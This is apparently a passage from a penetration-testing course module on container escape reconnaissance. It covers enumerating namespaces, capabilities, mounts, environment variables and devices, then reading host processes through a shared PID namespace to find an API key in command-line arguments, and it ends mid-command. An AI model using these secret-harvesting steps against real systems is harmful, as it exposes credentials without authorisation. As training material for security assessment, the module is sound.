1. Using VM "Container - Namespace 1", ssh into the container on port 2222 with the username root and the password root. Which namespace(s) does the container share with the host? Use a comma to separate multiple and exclude cgroup, time, time_for_children, pid_for_children, and user from your answer.

Answer

2. Using VM "Container - Namespace 2", ssh into the container on port 2222 with the username root and the password root. Which namespace(s) does the container share with the host? Use a comma to separate multiple and exclude cgroup, time, time_for_children, pid_for_children, and user from your answer.

Answer

3. Using VM "Container - Namespace 3", ssh into the container on port 2222 with the username root and the password root. Which namespace(s) does the container share with the host? Use a comma to separate multiple and exclude cgroup, time, time_for_children, pid_for_children, and user from your answer.

Answer

4. Using VM "Container - Namespace 4", ssh into the container on port 2222 with the username root and the password root. Which namespace(s) does the container share with the host? Use a comma to separate multiple and exclude cgroup, time, time_for_children, pid_for_children, and user from your answer.

Answer

## 1.1.4. Enumerating Capabilities

Linux typically relies on either _privileged_ or _unprivileged_ processes. While an unprivileged process with appropriate user permissions may be able to write files to the system, list directories, check the date and time, and much more, it cannot, for example, edit files owned and restricted by other users, or load modules into the kernel. A privileged process, however, can do just about anything. One example of the difference between these processes would be an unprivileged user wanting to update the time of their host, which requires privileged access. Providing privileged access to a process just to update the time would be far too broad.

To help define such permissions, Linux has organized some _system-level tasks_ into just over 40 categories known as _capabilities_.[1](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_130-1) By limiting the capabilities assigned to a container, the container can have a limited attack surface. Docker, Podman, and other container runtimes use a default set of capabilities that should prevent escapes. However, not all of these runtimes have the same default list, and each allows users to add additional capabilities to a container.

Some applications require additional capabilities than those included by default. For example, _Nmap_ requires the CAP_NET_RAW capability that Podman does not have by default. This means to run Nmap in Podman, we'll have to add the CAP_NET_RAW capability to the container. Adding this capability does not inherently result in a guaranteed way to escape the container, but it _does_ increase its attack surface. Docker[2](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_130-2) and containerd,[3](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_130-3) alternatively, include this capability by default.

In terms of capabilities, Docker and containerd are the least secure, since they provide containers with the most capabilities by default. Of the common runtimes, Podman[4](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_130-4) provides less than Docker, while _CRI-O_[5](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_130-5) provides the least.

![[OffSec/Cloud/Cloud Attacks - Container Escapes Skill Path/z. images/6ca99a821214272147115b2d8befec48_MD5.jpg]]

Figure 1: List of Capabilities in Common Runtimes

Let's start a container with Docker using the default capabilities and inspect the **/proc** file system to find the capabilities Docker provided to the container.

```
student@sandbox:~$ docker run -it --rm ubuntu /bin/bash
root@3bdc3f434219:/#
```

> Listing 16 - Starting Container with Docker

To the host, a container is just a process with certain restrictions. That means that within the container, we should be able to query information about the current process. Containers with their own _pid_ namespace will start the initial process with a PID of 1. This means if we inspect the status of the first PID, we should be able to find the capabilities that we have access to. Let's **cat** out the **/proc/1/status** file and **grep** for **Cap**.

```
root@3bdc3f434219:/# cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
root@3bdc3f434219:/#
```

> Listing 17 - Listing Capabilities from proc

The values in _CapPrm_, _CapEff_, and _CapBnd_ represent the list of capabilities. However, they're currently _encoded_, and we have to _decode_ them into something more useful. We can do this using the _capsh_ utility. Rarely will we find capsh installed in container images, so instead we'll use our Kali machine to decode the values. We'll use the **--decode** flag to provide the value we found.

```
kali@kali:~$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

> Listing 18 - Decoding the Capability

As shown in the Listing above, the decoded value contains the list of all default Docker capabilities. Let's try it again, this time using the **--privileged** flag in Docker to add all the capabilities that Docker supports.

```
student@sandbox:~$ docker run -it --rm --privileged ubuntu /bin/bash

root@8b65abf35f83:/#  cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

root@8b65abf35f83:/# exit
exit
```

> Listing 19 - Capabilities for Privileged Container in Docker

Next, let's decode the value with **capsh** and the **--decode** flag.

```
kali@kali:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

> Listing 18 - Decoding the Capability

As shown in the Listing above, our container has access to all the capabilities. The highlighted capabilities are some of the more dangerous capabilities for a container to have. Some might allow us to reboot the system and cause a _denial of service_ (CAP_SYS_BOOT), while others may allow us to completely compromise the host (CAP_SYS_ADMIN).

Tools to automatically extract the capabilities exist, but they automate the process of grabbing the value from the **/proc** file system. By working manually, we don't have to worry about downloading and installing new tools or transferring binaries to the container. However, it is important to mention that using capsh (**capsh --print**) or the _getpcaps_ tool (**getpcaps 1**) will also display the capabilities. Both of these tools need to be installed on the container in order for us to use them. Since installing additional tools might trigger certain alerts, we prefer to use the manual method.

1

(Michael Kerrisk, 2021), [https://man7.org/linux/man-pages/man7/capabilities.7.html](https://man7.org/linux/man-pages/man7/capabilities.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_130-1)

2

(Moby, 2019), [https://github.com/moby/moby/blob/1308a3a99faa13ff279dcb4eb5ad23aee3ab5cdb/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/1308a3a99faa13ff279dcb4eb5ad23aee3ab5cdb/oci/caps/defaults.go#L6-L19) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_130-2)

3

(containerd, 2021), [https://github.com/containerd/containerd/blob/551516a18d0a60c4afbc85e7588af356191eaead/oci/spec.go#L93](https://github.com/containerd/containerd/blob/551516a18d0a60c4afbc85e7588af356191eaead/oci/spec.go#L93) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_130-3)

4

(Containers, 2022), [https://github.com/containers/common/blob/72a7da3358ac8c560c0d685651e2acf53f7af074/pkg/config/containers.conf#L55](https://github.com/containers/common/blob/72a7da3358ac8c560c0d685651e2acf53f7af074/pkg/config/containers.conf#L55) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_130-4)

5

(cri-o, 2022), [https://github.com/cri-o/cri-o/blob/2c43fb8a34e1cf59266e2f9a903e9ce88bf4c8ef/internal/config/capabilities/capabilities.go](https://github.com/cri-o/cri-o/blob/2c43fb8a34e1cf59266e2f9a903e9ce88bf4c8ef/internal/config/capabilities/capabilities.go) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_130-5)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Container - Capabilities 1

Container - Capabilities 2

Container - Capabilities 3

Container - Capabilities 4

#### Labs

1. What does 00000000880405fb Capability decode to using capsh?

Answer

2. What is the encoded value of CapEff of a container which has only the CAP_SYS_PTRACE, CAP_NET_ADMIN, and CAP_SYS_CHROOT capability?

Answer

3. Using VM "Container - Capabilities 1", ssh into the container on port 2222 with the username root and the password root. Which additional capabilities were added to the container? Use a comma to separate multiple capabilities. Only list capabilities that were added to the container. Do not list standard capabilities set by the runtime of the target. Use "None" if it's the default set of capabilities for that runtime.

Answer

4. Using VM "Container - Capabilities 2", ssh into the container on port 2222 with the username root and the password root. Which additional capabilities were added to the container? Use a comma to separate multiple capabilities. Only list capabilities that were added to the container. Do not list standard capabilities set by the runtime of the target. Use "None" if it's the default set of capabilities for that runtime.

Answer

5. Using VM "Container - Capabilities 3", ssh into the container on port 2222 with the username root and the password root. Which additional capabilities were added to the container? Use a comma to separate multiple capabilities. Only list capabilities that were added to the container. Do not list standard capabilities set by the runtime of the target. Use "None" if it's the default set of capabilities for that runtime.

Answer

6. Using VM "Container - Capabilities 4", ssh into the container on port 2222 with the username root and the password root. Which additional capabilities were added to the container? Use a comma to separate multiple capabilities. Only list capabilities that were added to the container. Do not list standard capabilities set by the runtime of the target. Use "None" if it's the default set of capabilities for that runtime.

Answer

## 1.1.5. Discovering Container Mounts

Containers may have files and directories mounted to the container file system. These volumes might be directories mounted from the host's file system, remote NFS shares, cloud-based storage, and much more. Container images themselves should not hold sensitive data. Instead, it's recommended to add the sensitive file by mounting it to the container.

If we review the container mounts, we can shorten our search for sensitive data by identifying which files the administrator specifically mounted to the container. We'll find the list of mounts by reviewing **/proc/mounts**.

Let's start a container in Podman with **sudo** and review the default mounts by observing the contents of **/proc/mounts**.

```
student@sandbox:~$ sudo podman run -it --rm  ubuntu /bin/bash

root@fc4702c63317:/# cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/Q7AG3MO3RSIUVJCQ5VDLPWAQXF,upperdir=/var/lib/containers/storage/overlay/401cca96aee318cbcf09361dab164c05f81cb4c26bef90110d46263b57facd7a/diff,workdir=/var/lib/containers/storage/overlay/401cca96aee318cbcf09361dab164c05f81cb4c26bef90110d46263b57facd7a/work,volatile 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /run/.containerenv tmpfs rw,nosuid,nodev,noexec,relatime,size=99252k,mode=755,inode64 0 0
tmpfs /etc/resolv.conf tmpfs rw,nosuid,nodev,noexec,relatime,size=99252k,mode=755,inode64 0 0
tmpfs /etc/hosts tmpfs rw,nosuid,nodev,noexec,relatime,size=99252k,mode=755,inode64 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=64000k,inode64 0 0
tmpfs /etc/hostname tmpfs rw,nosuid,nodev,noexec,relatime,size=99252k,mode=755,inode64 0 0
cgroup /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,size=1024k,inode64 0 0
cgroup /sys/fs/cgroup/misc cgroup ro,nosuid,nodev,noexec,relatime,misc 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
tmpfs /proc/acpi tmpfs ro,relatime,size=0k,inode64 0 0
udev /proc/kcore devtmpfs rw,nosuid,relatime,size=439500k,nr_inodes=109875,mode=755,inode64 0 0
udev /proc/keys devtmpfs rw,nosuid,relatime,size=439500k,nr_inodes=109875,mode=755,inode64 0 0
udev /proc/timer_list devtmpfs rw,nosuid,relatime,size=439500k,nr_inodes=109875,mode=755,inode64 0 0
tmpfs /proc/scsi tmpfs ro,relatime,size=0k,inode64 0 0
tmpfs /sys/firmware tmpfs ro,relatime,size=0k,inode64 0 0
tmpfs /sys/dev/block tmpfs ro,relatime,size=0k,inode64 0 0
proc /proc/bus proc ro,relatime 0 0
proc /proc/fs proc ro,relatime 0 0
proc /proc/irq proc ro,relatime 0 0
proc /proc/sys proc ro,relatime 0 0
proc /proc/sysrq-trigger proc ro,relatime 0 0
devpts /dev/console devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
```

> Listing 20 - Default Mounts in Podman

This list is fairly long, but most of the content is mounts for the **/proc/**, **dev**, and **sys** file systems, which allow the container to function. Podman does also mount other important files like **/etc/hostname/** for the hostname, **/etc/resolv.conf** for DNS resolution, and **/etc/hosts** for local name resolution. This list also contains a mount for **/run/.containerenv**, which is unique to Podman.

The most interesting mount in this list is the root filesystem mount, which uses _OverlayFS_. While we won't go into the details of OverlayFS, it's important to know that the _upperdir_ parameter points to the location of the container on the host file system. This information is incredibly useful when we attempt to escape a container since we'll need the full path of a script that we want the host to execute.

While this information is useful, let's also review how a non-standard mount appears in **/proc/mounts**. We'll exit the container and start a new one. This time, we'll use the **-v** option to mount **/home/student/data** to the **/data** directory in the container. Before we can start the container, we need to create the **data** directory in the home directory. Finally, we can **grep** for **/data** in **/proc/mounts**.

```
root@4cc173a007d1:/# exit
exit
student@sandbox:~$ mkdir data

student@sandbox:~$ sudo podman run -it --rm -v /home/student/data:/data ubuntu /bin/bash

root@4dac86f528f9:/# grep /data /proc/mounts
/dev/mapper/ubuntu--vg-ubuntu--lv /data ext4 rw,relatime 0 0
```

> Listing 21 - Listing Mounts with Volume

As shown above, we'll find that the container has the **/data** volume mounted. The process of discovering mounts is the same whether it's a volume in Podman, Docker, or Kubernetes.

By default, container images should not have sensitive data, but secrets and sensitive configuration files will often be mounted as a volume into the container. That is why it's important to carefully inspect all mounts and identify those that are not system-related (root, sys, cgroups, etc.).

In addition to searching for sensitive secrets, mounts can also provide a vector for escape. For example, if a container mounts the host's _cronjob_ directory, and we can edit these jobs, we should be able to escape the container by creating a cron job that executes code in the host.

Oftentimes, we also often find sockets that control Docker, containerd, and other runtimes mounted in containers. Access to these sockets may also lead to a container escape.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Container - Mounts 1

Container - Mounts 2

Container - Mounts 3

#### Labs

1. Using VM "Container - Mounts 1", ssh into the container on port 2222 with the username root and the password root. Find the flag in the file mounted to the container.

Answer

2. Using VM "Container - Mounts 2", ssh into the container on port 2222 with the username root and the password root. Find the flag in the file mounted to the container.

Answer

3. Using VM "Container - Mounts 3", ssh into the container on port 2222 with the username root and the password root. Find the flag in the file mounted to the container. This flag will not follow the standard format of flags with "OS{...".

Answer

## 1.1.6. Environment Variables

As mentioned in the previous section, container images should not include secrets. In addition to mounting config files, a developer may also choose to use environment variables to configure an application. These variables may contain passwords or other secrets.

Let's start a container with an environment variable set and try to find it inside the running container. We'll use **podman** and the **--env** argument to set the **SECRET** variable to **SuperSecret**.

```
student@sandbox:~$ podman run -it --rm --env SECRET=SuperSecret ubuntu /bin/bash
root@7d51b23410a6:/# 
```

> Listing 22 - Starting Podman Container with Environment Variable

Once the container is running, we need a way to view all the environment variables. The **printenv** command is made for exactly this and is readily available on many images, including Ubuntu, _Alpine_, and _Debian_.

```
root@7d51b23410a6:/# printenv
HOSTNAME=7d51b23410a6
SECRET=SuperSecret
PWD=/
container=podman
HOME=/root
...
TERM=xterm
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/printenv
```

> Listing 23 - Listing all Environment Variables

In the output, we can find our environment variable.

In the rare case that printenv isn't available, we can also find the environment variables in **/proc/1/environ**. The delimiter between the variables is a null character, making it difficult for humans to read, so we'll need to replace the null variable with a new line. We can use **tr** to translate the null character (**\0**) to a new line character (**\n**).

```
root@7d51b23410a6:/# cat /proc/1/environ | tr '\0' '\n'
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TERM=xterm
container=podman
SECRET=SuperSecret
HOME=/root
HOSTNAME=7d51b23410a6
```

> Listing 24 - Using cat and tr to view env variables

Again, we can find the _SECRET_ variable and its value.

## 1.1.7. Container Device Enumeration

Often, a container may need to control or use devices like sound devices, external peripherals, and other devices connected to the host. Docker and Podman support adding devices to containers as a feature. Kubernetes supports it as well, but in a different way.

Devices might include external drives or even the host's main drive. If these are added to containers, an attacker may obtain access to the entire root file system of the host.

However, to use these devices, typically the target container must contain additional capabilities or namespaces. There might also be a vector to escape a container or gain additional privileges using the attached device.

By default, the **/dev** file system in a container should be relatively small compared to that of the host. Let's start a container with Docker and review the default devices attached.

```
student@sandbox:~$ docker run -it --rm  ubuntu /bin/bash

root@2ebae80fe002:/# ls -alh /dev/
total 4.0K
drwxr-xr-x 5 root root    360 Oct  5 18:42 .
drwxr-xr-x 1 root root   4.0K Oct  5 18:42 ..
crw--w---- 1 root tty  136, 0 Oct  5 18:42 console
lrwxrwxrwx 1 root root     11 Oct  5 18:42 core -> /proc/kcore
lrwxrwxrwx 1 root root     13 Oct  5 18:42 fd -> /proc/self/fd
crw-rw-rw- 1 root root   1, 7 Oct  5 18:42 full
drwxrwxrwt 2 root root     40 Oct  5 18:42 mqueue
crw-rw-rw- 1 root root   1, 3 Oct  5 18:42 null
lrwxrwxrwx 1 root root      8 Oct  5 18:42 ptmx -> pts/ptmx
drwxr-xr-x 2 root root      0 Oct  5 18:42 pts
crw-rw-rw- 1 root root   1, 8 Oct  5 18:42 random
drwxrwxrwt 2 root root     40 Oct  5 18:42 shm
lrwxrwxrwx 1 root root     15 Oct  5 18:42 stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root     15 Oct  5 18:42 stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root     15 Oct  5 18:42 stdout -> /proc/self/fd/1
crw-rw-rw- 1 root root   5, 0 Oct  5 18:42 tty
crw-rw-rw- 1 root root   1, 9 Oct  5 18:42 urandom
crw-rw-rw- 1 root root   1, 5 Oct  5 18:42 zero
```

> Listing 25 - Listing /dev in Default Docker Container

In the file Listing above, we'll find some familiar items. For example, _stderr_, _stdin_, and _stdout_ are the standard streams. We also find the **/dev/random** special file used for generating random values.

Let's exit the container and mount a device to it. We'll mount the sound device located on **/dev/snd** on the host. We can add this device to the container using the **--device** option.

```
root@2ebae80fe002:/# exit
exit

student@sandbox:~$ docker run -it --rm --device /dev/snd  ubuntu /bin/bash

root@d9722459db55:/# ls -alh /dev/
total 4.0K
drwxr-xr-x 6 root root    380 Oct  5 19:14 .
drwxr-xr-x 1 root root   4.0K Oct  5 19:14 ..
crw--w---- 1 root tty  136, 0 Oct  5 19:15 console
lrwxrwxrwx 1 root root     11 Oct  5 19:14 core -> /proc/kcore
lrwxrwxrwx 1 root root     13 Oct  5 19:14 fd -> /proc/self/fd
crw-rw-rw- 1 root root   1, 7 Oct  5 19:14 full
drwxrwxrwt 2 root root     40 Oct  5 19:14 mqueue
crw-rw-rw- 1 root root   1, 3 Oct  5 19:14 null
lrwxrwxrwx 1 root root      8 Oct  5 19:14 ptmx -> pts/ptmx
drwxr-xr-x 2 root root      0 Oct  5 19:14 pts
crw-rw-rw- 1 root root   1, 8 Oct  5 19:14 random
drwxrwxrwt 2 root root     40 Oct  5 19:14 shm
drwxr-xr-x 2 root root     80 Oct  5 19:14 snd
lrwxrwxrwx 1 root root     15 Oct  5 19:14 stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root     15 Oct  5 19:14 stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root     15 Oct  5 19:14 stdout -> /proc/self/fd/1
crw-rw-rw- 1 root root   5, 0 Oct  5 19:14 tty
crw-rw-rw- 1 root root   1, 9 Oct  5 19:14 urandom
crw-rw-rw- 1 root root   1, 5 Oct  5 19:14 zero
```

> Listing 26 - Adding a device to a container

Behind the scenes, Docker adds the sound device to the container and provides it access via the cgroups Device Controller. This allows the container to use the device. However, this often causes issues as the container might still be restricted in some way from interfacing with the device. Often, rather than debugging why access to the device is limited and fixing the issue, online communities instead recommended to use **--privileged**. The purpose of the **--device** option is to prevent a user from having to use the **--privileged** flag. Unlike **--device**, which mounts only the specific device, **--privileged** gives a container access to all devices.

Kubernetes, at the time of this writing, does not support a device feature like Docker and Podman. Instead, it supports device plugins[1](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_142-1) where a device vendor would create a plugin for their specific device to make it availible on a node. For example, Intel has created a device plugin for various intel devices like their GPU[2](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_142-2). However, if a plugin doesn't exist, we often find that the device is mounted to a container as a volume. This doesn't apply the appropriate cgroup rules to allow the container to interact with the device. Kubernetes also doesn't support creating custom cgroup rules to allow appropriate access. To fix this, it's often recommended to run a privileged container. This defeats the purpose of only mounting the single device, since the container will have access to all devices.

In essence, if we discover devices in a container that are not mounted by default during an assessment, we should investigate further. We should especially focus on the capabilities and the namespaces of the container since additional privileges are often needed to manage a device.

1

(kubernetes, 2023), [https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/device-plugins/](https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/device-plugins/) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_142-1)

2

(Intel, 2023), [https://github.com/intel/intel-device-plugins-for-kubernetes](https://github.com/intel/intel-device-plugins-for-kubernetes) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_142-2)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Container - Devices 1

Container - Devices 2

#### Labs

1. Using VM "Container - Devices 1", ssh into the container on port 2222 with the username root and the password root. Which device is mounted to the container that is not standard?

Answer

2. Using VM "Container - Devices 2", ssh into the container on port 2222 with the username root and the password root. Which device is mounted to the container that is not standard?

Answer

## 1.2. Discovering Sensitive Data

While obtaining a shell on the underlying host is a common goal, it's not always possible. At times, we may only be able to read sensitive information from the target. This information may be useful in obtaining additional access to the host or to other systems in the environment.

This Learning Unit covers the following Learning Objectives:

- Verifying access to the PID namespace
- Discovering secrets in command line arguments
- Finding secrets in environment variables of other containers
- Understanding how to access the standard-in and standard-out of other processes
- Accessing the filesystem of other containers

## 1.2.1. Accessing the Labs - Discovering Sensitive Data

In this Learning Unit, we'll use a single server running multiple containers, two of which we have shell access to. We'll use these containers to learn about discovering sensitive data about a host in a container. Accessing the containers will simulate having received a shell from a previous attack against an application running in the containers.

Let's start the virtual machine for the section below. We will connect to one of our shells via SSH on port 2222, and later we'll connect to the other port on 2223. We will conduct our attack from these shells. It's important to note that the victim container contains several non-standard binaries (such as **nmap**). We've provided these to simplify access. In the real world, these would have to be transferred or installed.

Let's start the _Host PID - Example_ host for the _Host PID - Accessing Host Processes_ portion and continue with the Module.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Container - Host PID - Example

## 1.2.2. Host PID - Accessing Host Processes

Sharing the _PID_ namespace with the host might seem benign to an inexperienced engineer, but it can have a significant impact on the security of an environment. We'll start this section with the assumption that we've obtained a shell on a container. We'll use this container and discover that it shares the PID namespace with the host. From there, we'll extract information about the host and find various secrets from other processes.

Let's start by connecting to our shell using SSH. Both the username and password of the container will be _root_.

```
kali@kali:~$ ssh -p 2222 root@sandbox
root@sandbox's password:
Welcome to Alpine!
...

victim:~#
```

> Listing 27 - Connecting to the Shell via ssh

First, we'll check which namespaces we might be sharing with the host by listing **/proc/self/ns** and including the inodes. To find the inode, we can use the **-i** flag in **ls**. We'll instruct **ls** to follow the _symlink_ with **-L**, and we'll display the long format with **-l**. We'll also pipe the output into **sort** to order the files based on their inode.

```
victim:~# ls -liL /proc/self/ns | sort
4026531834 -r--r--r--    1 root     root             0 Oct  6 19:03 time
4026531834 -r--r--r--    1 root     root             0 Oct  6 19:03 time_for_children
4026531835 -r--r--r--    1 root     root             0 Oct  6 19:03 cgroup
4026531836 -r--r--r--    1 root     root             0 Oct  6 19:03 pid
4026531836 -r--r--r--    1 root     root             0 Oct  6 19:03 pid_for_children
4026531837 -r--r--r--    1 root     root             0 Oct  6 19:03 user
4026533156 -r--r--r--    1 root     root             0 Oct  6 19:03 mnt
4026533157 -r--r--r--    1 root     root             0 Oct  6 19:03 uts
4026533158 -r--r--r--    1 root     root             0 Oct  6 19:03 ipc
4026533159 -r--r--r--    1 root     root             0 Oct  6 18:53 net
```

> Listing 28 - Listing inodes of namespace information

In the listing, we find that the _pid_ namespace (along with time, cgroup, and user) was created earlier than the other namespaces. This means that we're sharing our PID namespace with the host. We can also confirm this by running **ps**.

```
victim:~# ps | head
PID   USER     TIME  COMMAND
    1 root      0:03 {systemd} /sbin/init
    2 root      0:00 [kthreadd]
    3 root      0:00 [rcu_gp]
    4 root      0:00 [rcu_par_gp]
    5 root      0:00 [netns]
    7 root      0:00 [kworker/0:0H-ev]
    9 root      0:00 [mm_percpu_wq]
   10 root      0:00 [rcu_tasks_rude_]
   11 root      0:00 [rcu_tasks_trace]
```

> Listing 29 - Obtaining a list of all processes

We'll find in the output that the first process is **/sbin/init**. While not definitive, this strongly suggests that we're finding the list of processes for the host and not only this container.

This list can be very useful. Let's list all processes with their PID and the arguments. This allows us to collect more information about the host and find any secrets in the command line argument.

```
victim:~# ps -o pid,args
PID   COMMAND
  871 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
...
40554 mysqld
...
40764 {logger.sh} /bin/sh /logger.sh 100 5000
...
41594 {entrypoint.sh} /bin/sh /entrypoint.sh --api-key HTUNdY07est014PEMPCpWLo9iOf6ygwg
```

> Listing 30 - Listing Command and Arguments for all processes

We'll notice a few interesting processes in this list. First, we find that Docker is running on this host. Next, we find that _MySQL_ is running on this host. It's important to note that processes running in a container will show up as the name of the process instead of the container name. For this reason, we don't know at this point if _mysqld_ is running in a container or on the host directly. We also find an interesting _logger_ process. We'll investigate the logger and mysqld processes later.

Finally, we find a script called **entrypoint.sh** with a command line argument that exposes an API key. If we were conducting a security assessment, this API key might be very valuable to us. However, we don't know what **entrypoint.sh** does. Let's investigate that **/proc** directory and attempt to find more information. We'll take the process ID (41594) and change directories to its respective directory in **/proc**. Once we change directories, we'll list the contents.

```
victim:~# cd /proc/41594/

victim:/proc/41594# ls
attr             loginuid         sched
autogroup        map_files        schedstat
auxv             maps             sessionid
cgroup           mem              setgroups
clear_refs       mountinfo        smaps
cmdline          mounts           smaps_rollup
comm             mountstats       stack
coredump_filter  net              stat
cpuset           ns               statm
cwd              numa_maps        status
environ          oom_adj          syscall
exe              oom_score        task
fd               oom_score_adj    timens_offsets
fdinfo           pagemap          timers
gid_map          personality      timerslack_ns
io               projid_map       uid_map
limits           root             wchan
```

> Listing 31 - Entering the PID Directory for Proccess

Several of these files are particularly interesting to us. First, the command line arguments can be found in **cmdline**. We can also find the environment variables in **environ** (we'll inspect this a little later.) The **cwd** directory is very interesting because it contains a link to the file system at the current working directory. The **root** directory contains a link to the root directory of the process. The **ns** directory contains namespace information for the process. Finally, **mounts** contains information about the mounted file systems.

We won't inspect all of these, but let's investigate the **root** directory and the **environ** entry.

```
victim:/proc/41594# cat environ
